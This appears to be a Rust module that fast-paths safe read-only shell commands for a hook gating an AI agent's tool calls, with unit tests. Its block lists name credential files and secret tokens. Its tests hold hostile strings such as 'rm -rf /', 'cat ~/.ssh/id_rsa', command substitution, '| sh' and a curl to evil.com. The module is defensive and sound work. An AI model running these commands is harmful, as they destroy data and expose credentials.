use crate::protocol::{HookContext, HookDecision};

/// Extremely fast short-circuit check for common read-only commands.
/// If matched, returns Some(HookDecision::Allow) in < 0.01ms without loading the JS engine.
///
/// # Security model
/// Fast path is a security boundary: it must NEVER approve a command string that
/// could execute more than the single benign command the prefix claims. Therefore:
/// - Multi-statement / chaining syntax is rejected outright (newline, `;`, `|`,
///   `&`, `&&`, `||`, redirections, command substitution `$( )`, `${ }`,
///   backticks).
/// - After a safe prefix matches, the remainder must start with whitespace or be
///   empty (`git statusX` never matches `git status`) so prefixes cannot be
///   glued to attacker-controlled text.
/// - Anything not matched falls through to the JS rule engine.
pub fn check_fast_path(ctx: &HookContext) -> Option<HookDecision> {
    let cmd = ctx.cmd.as_deref()?;
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return None;
    }

    // 0. Dedicated check for sealed, safe `ai-hook` self-test / benchmark commands.
    //    Allows developers and IDE test runners to evaluate rules without triggering
    //    outer observer hooks on the test payload itself, with strict zero injection risk.
    if is_safe_ai_hook_test_invocation(trimmed) {
        return Some(HookDecision::Allow);
    }

    // 1. Quick prefix check first! If the command doesn't start with any safe prefix,
    // bail immediately in nanoseconds without running any further checks or allocations.
    let safe_prefixes = [
        "git status",
        "git diff",
        "git log",
        "git branch",
        "git show",
        "git remote",
        "git rev-parse",
        "ls",
        "pwd",
        "dir",
        "echo",
        "which",
        "where",
        "cat",
        "head",
        "tail",
    ];

    let mut matched = false;
    let mut matched_prefix = "";
    for prefix in safe_prefixes {
        if trimmed == prefix {
            matched = true;
            matched_prefix = prefix;
            break;
        }
        if let Some(rest) = trimmed.strip_prefix(prefix) {
            // `git status--foo` must not match `git status`; require a boundary.
            if rest.starts_with(|c: char| c.is_whitespace()) {
                matched = true;
                matched_prefix = prefix;
                break;
            }
        }
    }

    if !matched {
        return None;
    }

    // 2. Reject control characters and shell metacharacters that allow
    //    multiple statements, chaining or substitution.
    if trimmed.contains(&['\n', '\r', ';', '|', '&', '>', '<', '`'][..]) {
        return None;
    }
    // Command substitution `$(...)` / `${...}`:
    // `echo $(evil)` would otherwise ride on the "echo " prefix.
    if trimmed.contains("$(") || trimmed.contains("${") {
        return None;
    }

    // 3. Per-prefix write guards: a whitelisted prefix must only pass its
    //    read-only surface. Substring matching is deliberately over-broad
    //    (e.g. "-d" also rejects "--no-describe"): a false positive only
    //    costs one trip through the rule engine, a false negative silently
    //    bypasses the gate.
    match matched_prefix {
        // `git branch` writes: delete (-d/-D/--delete), rename (-m/-M/--move),
        // copy (-c/-C/--copy), force (-f/--force), upstream (-u/--set-upstream/
        // --unset-upstream/--track/--no-track), description (--edit).
        // Short flags are checked per cluster character (so "-vd", "-dmain"
        // and "-d" are all caught) while long flags are checked by prefix
        // ("--set-upstream=x" is caught, "--show-current" is not).
        "git branch" => {
            const BRANCH_WRITE_SHORTS: &[char] = &['d', 'D', 'm', 'M', 'c', 'C', 'u', 'f'];
            const BRANCH_WRITE_LONGS: &[&str] = &[
                "--delete",
                "--move",
                "--copy",
                "--edit",
                "--force",
                "--set-upstream",
                "--unset-upstream",
                "--track",
                "--no-track",
            ];
            let writes = trimmed.split_whitespace().any(|tok| {
                if tok.starts_with('-') && !tok.starts_with("--") {
                    tok[1..].chars().any(|c| BRANCH_WRITE_SHORTS.contains(&c))
                } else {
                    BRANCH_WRITE_LONGS.iter().any(|f| tok.starts_with(f))
                }
            });
            if writes {
                return None;
            }
        }
        // `git remote` writes config or touches the network: add / rename /
        // remove / set-url / set-head / prune / update. Only the read-only
        // surface passes (bare list, -v/--verbose, show, get-url). The
        // verbose flags are skipped as *tokens*, not prefixes: git's
        // parse_options consumes `-v` before dispatching on the subcommand,
        // so `git remote -v add evil <url>` is a real `add` — matching a
        // bare ` -v` prefix would let it through as "read-only".
        "git remote" => {
            let rest = &trimmed[matched_prefix.len()..];
            let mut tokens = rest
                .split_whitespace()
                .skip_while(|tok| *tok == "-v" || *tok == "--verbose");
            let read_only = match tokens.next() {
                None => true, // bare list (with or without -v/--verbose)
                Some(sub) => sub == "show" || sub == "get-url",
            };
            if !read_only {
                return None;
            }
        }
        // git diff/log/show all accept `--output=<file>` / `--output <file>`
        // and their short form `-o <file>` / `-o<file>`, which writes the
        // output to disk — that is a write, not a read. `--o…` long options
        // are excluded from the short-form check so `git log --oneline`
        // keeps its fast path.
        // `--output=<file>` / `-o <file>` 把输出写到磁盘;
        // `--ext-diff` / `--textconv` 更危险:它们让 git 去执行
        // `diff.<driver>.command` 或 `*.txt diff=foo` 配置的外部驱动 ——
        // 白名单宣称"只放行单条只读命令",而这两个开关会拉起任意可执行
        // 文件(config 里配什么就是什么),等于把旁路变成代码执行入口。
        "git diff" | "git log" | "git show" => {
            let writes = trimmed.contains("--output")
                || trimmed.contains("--ext-diff")
                || trimmed.contains("--textconv")
                || trimmed
                    .split_whitespace()
                    .any(|tok| tok.starts_with("-o") && !tok.starts_with("--"));
            if writes {
                return None;
            }
        }
        _ => {}
    }

    let dangerous_tokens = [
        "prod", "drop", "truncate", "delete", "remove", "migrate", "flush", "rm ", "restart",
        "stop", "kill", "token", "password", "secret", "shutdown", "reboot", "mkfs",
    ];

    // Credential / private-key targets.
    //
    // The whitelisted prefixes include `cat` / `head` / `tail` — the very
    // commands used to read secrets. Without these tokens a command like
    // `cat ~/.ssh/id_rsa` sails through the bypass and any "protect secret
    // reads" rule never runs. The match is a plain substring scan, so it is
    // deliberately over-broad (`_key` also matches a source file named
    // `path_keys.rs`): a false positive
    // only costs one trip through the rule engine, a false negative silently
    // bypasses the gate.
    let sensitive_tokens = [
        ".ssh",
        "id_rsa",
        "id_ed25519",
        "id_ecdsa",
        "id_dsa",
        "credentials",
        ".aws",
        ".netrc",
        ".kube",
        "git-credentials",
        ".env",
        ".pem",
        ".key",
        ".p12",
        ".pfx",
        ".keystore",
        // Bulk secret channels: the process environment itself, classic
        // account databases, and API keys whose name carries no other token
        // (`echo $OPENAI_API_KEY` must not ride the `echo ` prefix).
        "environ",
        "passwd",
        "shadow",
        "api_key",
        "apikey",
        "_key",
        ".kdbx",
        "hosts.yml",
        ".npmrc",
        ".dockercfg",
        ".docker",
        "auth_token",
        "bearer",
        "private_key",
        "secret_key",
        "access_token",
    ];

    // Zero-allocation case-insensitive ASCII substring search
    let bytes = trimmed.as_bytes();
    for token in dangerous_tokens.iter().chain(sensitive_tokens.iter()) {
        let t_bytes = token.as_bytes();
        if bytes.len() >= t_bytes.len()
            && bytes.windows(t_bytes.len()).any(|w| {
                w.iter()
                    .zip(t_bytes.iter())
                    .all(|(a, b)| a.eq_ignore_ascii_case(b))
            })
        {
            return None;
        }
    }

    Some(HookDecision::Allow)
}

/// Helper: Checks if an executable string or path refers specifically to `ai-hook` or `ai-hook.exe`.
/// Rejects relative paths (e.g. `./ai-hook`, `.\ai-hook.exe`, `dir/ai-hook.exe`) to prevent local
/// workspace binary masquerading / Trojan attacks.
pub(crate) fn is_ai_hook_bin(token: &str) -> bool {
    let clean = token.trim_matches(&['"', '\''][..]);
    if clean.is_empty() {
        return false;
    }

    // 1. Explicitly reject relative path prefixes
    if clean.starts_with("./")
        || clean.starts_with(".\\")
        || clean.starts_with("../")
        || clean.starts_with("..\\")
    {
        return false;
    }

    // 2. Case A: Bare binary name without path separators (relies on OS PATH lookup)
    if !clean.contains('/') && !clean.contains('\\') {
        return clean.eq_ignore_ascii_case("ai-hook") || clean.eq_ignore_ascii_case("ai-hook.exe");
    }

    // 3. Case B: Must be a genuine absolute path (not a relative subpath like `bin/ai-hook`).
    // Supports both Unix root paths (`/...`) and Windows drive/UNC paths (`C:\...`, `\\server\...`)
    // cross-platform so that tests and cross-compiled runs behave consistently.
    let is_windows_abs = (clean.len() >= 3
        && clean.as_bytes()[0].is_ascii_alphabetic()
        && clean.as_bytes()[1] == b':'
        && (clean.as_bytes()[2] == b'\\' || clean.as_bytes()[2] == b'/'))
        || clean.starts_with("\\\\");
    let is_unix_abs = clean.starts_with('/');

    if !is_windows_abs && !is_unix_abs {
        return false;
    }

    let file_name = clean.rsplit(&['/', '\\'][..]).next().unwrap_or(clean);
    file_name.eq_ignore_ascii_case("ai-hook") || file_name.eq_ignore_ascii_case("ai-hook.exe")
}

/// Tokenize command line into tokens respecting single and double quotes.
/// Returns an empty vector if quotes are unclosed or malformed.
pub(crate) fn tokenize_simple(cmd: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = cmd.chars().peekable();

    while let Some(ch) = chars.next() {
        if ch == '\\' && !in_single {
            if let Some(&next) = chars.peek()
                && (next == '"' || next == '\\')
            {
                chars.next();
                current.push(next);
                continue;
            }
            current.push('\\');
            continue;
        }
        if ch == '\'' && !in_double {
            // PowerShell escaped quote '' inside single quote
            if in_single && chars.peek() == Some(&'\'') {
                chars.next();
                current.push('\'');
                continue;
            }
            in_single = !in_single;
            continue;
        }
        if ch == '"' && !in_single {
            in_double = !in_double;
            continue;
        }
        if ch.is_whitespace() && !in_single && !in_double {
            if !current.is_empty() {
                tokens.push(current);
                current = String::new();
            }
            continue;
        }
        current.push(ch);
    }

    if in_single || in_double {
        // Unclosed quotes: malformed command line
        return Vec::new();
    }

    if !current.is_empty() {
        tokens.push(current);
    }
    tokens
}

/// Scans for the end of a single-quoted string literal, handling escaped single quotes `''`.
/// Returns the offset of the closing single quote if properly closed.
fn find_single_quote_end(s: &str) -> Option<usize> {
    let bytes = s.as_bytes();
    if bytes.first() != Some(&b'\'') {
        return None;
    }
    let mut idx = 1;
    while idx < bytes.len() {
        if bytes[idx] == b'\'' {
            if idx + 1 < bytes.len() && bytes[idx + 1] == b'\'' {
                idx += 2; // escaped quote ''
            } else {
                return Some(idx);
            }
        } else {
            idx += 1;
        }
    }
    None
}

/// Finds the index of a single, top-level pipe character `|` outside of any single or double quotes.
/// Returns None if there are zero top-level pipes, more than one top-level pipe, or unclosed quotes.
fn find_single_top_level_pipe(cmd: &str) -> Option<usize> {
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    let mut pipe_idx = None;

    let chars: Vec<(usize, char)> = cmd.char_indices().collect();
    let mut i = 0;
    while i < chars.len() {
        let (byte_idx, ch) = chars[i];

        if escaped {
            escaped = false;
            i += 1;
            continue;
        }

        if ch == '\\' && !in_single {
            escaped = true;
            i += 1;
            continue;
        }

        if ch == '\'' && !in_double {
            // In PowerShell, '' inside single quote is an escaped quote
            if in_single && i + 1 < chars.len() && chars[i + 1].1 == '\'' {
                i += 2;
                continue;
            }
            in_single = !in_single;
            i += 1;
            continue;
        }

        if ch == '"' && !in_single {
            in_double = !in_double;
            i += 1;
            continue;
        }

        if ch == '|' && !in_single && !in_double {
            if pipe_idx.is_some() {
                // More than one top-level pipe: reject chaining
                return None;
            }
            pipe_idx = Some(byte_idx);
        }

        i += 1;
    }

    if in_single || in_double || escaped {
        return None;
    }

    pipe_idx
}

/// Extracts the first subcommand token from token list, properly skipping leading global flags
/// (both standalone flags and flags consuming an argument value like `--timeout 60`).
fn find_subcommand(tokens: &[String]) -> Option<&str> {
    let mut i = 0;
    while i < tokens.len() {
        let tok = &tokens[i];
        if tok.starts_with('-') {
            let consumes_value = matches!(
                tok.as_str(),
                "-r" | "--rule" | "--timeout" | "--rule-timeout" | "--max-files" | "-n"
            );
            if consumes_value && !tok.contains('=') {
                i += 2; // skip flag and its following value
                continue;
            }
            i += 1;
            continue;
        }
        return Some(tok.as_str());
    }
    None
}

/// Validates that the upstream command of a pipeline is purely producing a literal payload without executing external code.
fn is_safe_upstream_payload(upstream: &str) -> bool {
    let u = upstream.trim();

    // Pattern 1: Pure bare single-quoted string literal:
    // e.g. `'{"conversationId":...}'`
    if u.starts_with('\'')
        && let Some(q_end) = find_single_quote_end(u)
    {
        let remainder = u[q_end + 1..].trim();
        if remainder.is_empty() {
            return true;
        }
    }

    // Pattern 2: POSIX echo or PowerShell Write-Output with single-quoted string literal:
    if let Some(rest) = u.strip_prefix("echo ").or_else(|| u.strip_prefix("echo\t")) {
        let mut rest_trimmed = rest.trim();
        // Skip optional safe flags like -n, -e, -E, -ne
        while rest_trimmed.starts_with('-') {
            if let Some((flag, after)) = rest_trimmed.split_once(char::is_whitespace) {
                let f = flag.trim();
                if f == "-n" || f == "-e" || f == "-E" || f == "-ne" || f == "-en" {
                    rest_trimmed = after.trim_start();
                    continue;
                }
            }
            break;
        }

        if let Some(q_end) = find_single_quote_end(rest_trimmed) {
            let remainder = rest_trimmed[q_end + 1..].trim();
            return remainder.is_empty();
        }
        return false;
    }

    let u_lower = u.to_ascii_lowercase();
    if u_lower.starts_with("write-output ") || u_lower.starts_with("write-output\t") {
        let rest = u[12..].trim();
        if let Some(q_end) = find_single_quote_end(rest) {
            let remainder = rest[q_end + 1..].trim();
            return remainder.is_empty();
        }
        return false;
    }

    // Pattern 3: POSIX printf with format string and single-quoted string literal:
    if let Some(rest) = u.strip_prefix("printf ") {
        let rest_trimmed = rest.trim();
        let (fmt_len, has_fmt) =
            if rest_trimmed.starts_with("'%s\\n'") || rest_trimmed.starts_with("\"%s\\n\"") {
                (6, true)
            } else if rest_trimmed.starts_with("'%s'")
                || rest_trimmed.starts_with("\"%s\"")
                || rest_trimmed.starts_with("'%b'")
                || rest_trimmed.starts_with("\"%b\"")
            {
                (4, true)
            } else {
                (0, false)
            };

        let body = if has_fmt {
            rest_trimmed[fmt_len..].trim_start()
        } else {
            rest_trimmed
        };

        if let Some(q_end) = find_single_quote_end(body) {
            let remainder = body[q_end + 1..].trim();
            return remainder.is_empty();
        }
        return false;
    }

    // Pattern 4: PowerShell variable assignment and pass-through:
    // e.g. `$payload = '...'; $payload` or `$payload = '...'\n$payload`
    if u.starts_with('$')
        && let Some(eq_idx) = u.find('=')
    {
        let lhs = u[..eq_idx].trim();
        if lhs.starts_with('$')
            && lhs.len() > 1
            && lhs[1..].chars().all(|c| c.is_alphanumeric() || c == '_')
        {
            let var_name = lhs;
            let rhs = u[eq_idx + 1..].trim_start();
            if let Some(q_end) = find_single_quote_end(rhs) {
                let remainder = rhs[q_end + 1..].trim();
                let var_stmt =
                    remainder.trim_matches(|c| c == ';' || c == '\r' || c == '\n' || c == ' ');
                return var_stmt == var_name;
            }
        }
    }

    false
}

/// Checks if `cmd` is a safe direct invocation of `ai-hook test` or `ai-hook bench`.
/// Zero chaining, zero redirection, zero command substitution.
fn is_direct_ai_hook_test(cmd: &str) -> bool {
    // 1. Strictly forbid all chaining, redirection, and substitution metacharacters
    if cmd.contains(&['\n', '\r', ';', '|', '&', '>', '<', '`'][..]) {
        return false;
    }
    if cmd.contains("$(") || cmd.contains("${") {
        return false;
    }

    let tokens = tokenize_simple(cmd);
    if tokens.is_empty() {
        return false;
    }

    // 2. First token must be a trusted ai-hook or ai-hook.exe binary
    if !is_ai_hook_bin(&tokens[0]) {
        return false;
    }

    // 3. Find the subcommand token (skipping leading flags and flag values)
    match find_subcommand(&tokens[1..]) {
        Some(sub) => sub.eq_ignore_ascii_case("test") || sub.eq_ignore_ascii_case("bench"),
        None => false,
    }
}

/// Checks if `cmd` is a sealed, safe pipeline that feeds a literal test payload into `ai-hook`.
fn is_piped_ai_hook_test(cmd: &str) -> bool {
    // Top-level pipe split respecting quotes
    let pipe_idx = match find_single_top_level_pipe(cmd) {
        Some(idx) => idx,
        None => return false,
    };

    let upstream = cmd[..pipe_idx].trim();
    let downstream = cmd[pipe_idx + 1..].trim();

    // Downstream check: must not contain chaining, redirection, or command substitution
    if downstream.contains(';')
        || downstream.contains('\n')
        || downstream.contains('\r')
        || downstream.contains('&')
        || downstream.contains('>')
        || downstream.contains('<')
        || downstream.contains('`')
        || downstream.contains("$(")
        || downstream.contains("${")
    {
        return false;
    }

    // Downstream must start with trusted ai-hook binary
    let ds_tokens = tokenize_simple(downstream);
    if ds_tokens.is_empty() || !is_ai_hook_bin(&ds_tokens[0]) {
        return false;
    }

    // Downstream must NOT invoke management or destructive subcommands
    // (e.g. `clean`, `install`, `update`, `upgrade`, `prune`, `logs`)
    if let Some(sub) = find_subcommand(&ds_tokens[1..]) {
        let s = sub.to_ascii_lowercase();
        let is_eval_or_script = s == "test"
            || s == "bench"
            || s.ends_with(".js")
            || s.ends_with(".cjs")
            || s.ends_with(".mjs")
            || s.contains('/')
            || s.contains('\\');
        if !is_eval_or_script {
            return false;
        }
    }

    // Upstream check: must be a safe, sealed literal payload producer
    is_safe_upstream_payload(upstream)
}

/// Checks whether `cmd` is a safe `ai-hook` self-test invocation (direct CLI test/bench or sealed pipeline).
pub fn is_safe_ai_hook_test_invocation(cmd: &str) -> bool {
    is_direct_ai_hook_test(cmd) || is_piped_ai_hook_test(cmd)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ctx_for(cmd: &str) -> HookContext {
        let payload = serde_json::json!({
            "toolCall": {
                "name": "run_command",
                "args": { "CommandLine": cmd }
            }
        });
        HookContext::parse(&payload.to_string())
    }

    #[test]
    fn test_direct_ai_hook_test_fast_path() {
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook test \"rm -rf /\" protect-rm-root.js")),
            Some(HookDecision::Allow)
        );
        assert_eq!(
            check_fast_path(&ctx_for(
                "ai-hook.exe test 'cat ~/.ssh/id_rsa' protect-secret-read.js"
            )),
            Some(HookDecision::Allow)
        );
        assert_eq!(
            check_fast_path(&ctx_for(
                "C:\\bin\\ai-hook.exe test \"DROP TABLE users\" protect-sql.js"
            )),
            Some(HookDecision::Allow)
        );
        assert_eq!(
            check_fast_path(&ctx_for(
                "/usr/local/bin/ai-hook test \"DROP TABLE users\" protect-sql.js"
            )),
            Some(HookDecision::Allow)
        );
        assert_eq!(
            check_fast_path(&ctx_for(
                "ai-hook bench -i 1000 -c \"SELECT 1\" protect-sql.js"
            )),
            Some(HookDecision::Allow)
        );

        // Global flags with values before subcommand
        assert_eq!(
            check_fast_path(&ctx_for(
                "ai-hook --rule-timeout 5000 test \"rm -rf /\" rule.js"
            )),
            Some(HookDecision::Allow)
        );
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook --timeout 30 test \"rm -rf /\" rule.js")),
            Some(HookDecision::Allow)
        );
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook -r rule.js test \"rm -rf /\" extra.js")),
            Some(HookDecision::Allow)
        );
    }

    #[test]
    fn test_piped_ai_hook_test_fast_path() {
        let ps_cmd = "$payload = '{\"toolCall\":{\"name\":\"run_command\",\"args\":{\"CommandLine\":\"cat ~/.ssh/id_rsa\"}}}'; $payload | ai-hook --no-gui --no-fast-path C:/path/to/rule.js";
        assert_eq!(check_fast_path(&ctx_for(ps_cmd)), Some(HookDecision::Allow));

        let ps_multiline =
            "$payload = '{\"cmd\": \"rm -rf /\"}'\n$payload | ai-hook --no-gui rule.js";
        assert_eq!(
            check_fast_path(&ctx_for(ps_multiline)),
            Some(HookDecision::Allow)
        );

        let posix_printf = "printf '%s' '{\"toolCall\":\"rm -rf /\"}' | ai-hook --no-gui rule.js";
        assert_eq!(
            check_fast_path(&ctx_for(posix_printf)),
            Some(HookDecision::Allow)
        );

        let posix_printf_newline =
            "printf '%s\\n' '{\"toolCall\":\"rm -rf /\"}' | ai-hook --no-gui rule.js";
        assert_eq!(
            check_fast_path(&ctx_for(posix_printf_newline)),
            Some(HookDecision::Allow)
        );

        let posix_echo_n = "echo -n '{\"toolCall\":\"rm -rf /\"}' | ai-hook --no-gui rule.js";
        assert_eq!(
            check_fast_path(&ctx_for(posix_echo_n)),
            Some(HookDecision::Allow)
        );

        let bare_literal = "'{\"toolCall\":{\"name\":\"run_command\",\"args\":{\"CommandLine\":\"cat ~/.ssh/id_rsa\"}}}' | ai-hook --no-gui rule.js";
        assert_eq!(
            check_fast_path(&ctx_for(bare_literal)),
            Some(HookDecision::Allow)
        );

        let write_output = "Write-Output '{\"toolCall\":\"rm -rf /\"}' | ai-hook --no-gui rule.js";
        assert_eq!(
            check_fast_path(&ctx_for(write_output)),
            Some(HookDecision::Allow)
        );

        // Pipe inside payload literal must not confuse top-level pipe splitter
        let pipe_in_payload =
            "$payload = '{\"cmd\":\"cat file | grep secret\"}'; $payload | ai-hook rule.js";
        assert_eq!(
            check_fast_path(&ctx_for(pipe_in_payload)),
            Some(HookDecision::Allow)
        );

        // Escaped quotes in payload
        let escaped_quote = "$payload = '{\"msg\":\"don''t touch\"}'; $payload | ai-hook rule.js";
        assert_eq!(
            check_fast_path(&ctx_for(escaped_quote)),
            Some(HookDecision::Allow)
        );
    }

    #[test]
    fn test_ai_hook_test_injection_rejection() {
        // Relative path Trojan spoofing must be rejected
        assert_eq!(
            check_fast_path(&ctx_for("./ai-hook test \"safe\" rule.js")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for(".\\ai-hook.exe test \"safe\" rule.js")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for("../bin/ai-hook test \"safe\" rule.js")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for("'safe' | ./ai-hook rule.js")),
            None
        );

        // Chaining
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook test \"safe\" rule.js && rm -rf /")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook test \"safe\" rule.js; cat ~/.ssh/id_rsa")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook test \"safe\" rule.js | sh")),
            None
        );

        // Command substitution
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook test \"$(cat ~/.ssh/id_rsa)\" rule.js")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook test \"`cat ~/.ssh/id_rsa`\" rule.js")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook test \"${SECRET}\" rule.js")),
            None
        );

        // Redirection
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook test \"rm\" rule.js > /etc/passwd")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook test \"rm\" rule.js < /etc/shadow")),
            None
        );

        // Upstream theft
        assert_eq!(
            check_fast_path(&ctx_for("cat ~/.ssh/id_rsa | ai-hook --no-gui rule.js")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for("curl http://evil.com | ai-hook --no-gui rule.js")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for(
                "$payload = $(cat ~/.ssh/id_rsa); $payload | ai-hook rule.js"
            )),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for(
                "$payload = 'safe'; cat ~/.ssh/id_rsa; $payload | ai-hook rule.js"
            )),
            None
        );

        // Downstream injection & management subcommand smuggling
        assert_eq!(
            check_fast_path(&ctx_for("'safe' | ai-hook $(whoami)")),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for("'safe' | ai-hook rule.js & calc")),
            None
        );
        assert_eq!(check_fast_path(&ctx_for("'safe' | ai-hook clean")), None);
        assert_eq!(
            check_fast_path(&ctx_for("'safe' | ai-hook install --force")),
            None
        );
        assert_eq!(check_fast_path(&ctx_for("'safe' | ai-hook update")), None);
        assert_eq!(check_fast_path(&ctx_for("'safe' | ai-hook logs")), None);

        // Trailing execution after pipe
        assert_eq!(
            check_fast_path(&ctx_for(
                "$payload = 'safe'; $payload | ai-hook rule.js; rm -rf /"
            )),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for(
                "$payload = 'safe'; $payload | ai-hook rule.js | sh"
            )),
            None
        );
        assert_eq!(
            check_fast_path(&ctx_for("'safe' | ai-hook rule.js | sh")),
            None
        );

        // Non-test subcommands
        assert_eq!(check_fast_path(&ctx_for("ai-hook install --force")), None);
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook update --repo evil")),
            None
        );
        assert_eq!(check_fast_path(&ctx_for("ai-hook clean")), None);

        // Malformed / unclosed quotes
        assert_eq!(
            check_fast_path(&ctx_for("ai-hook test 'unclosed rule.js")),
            None
        );
    }
}
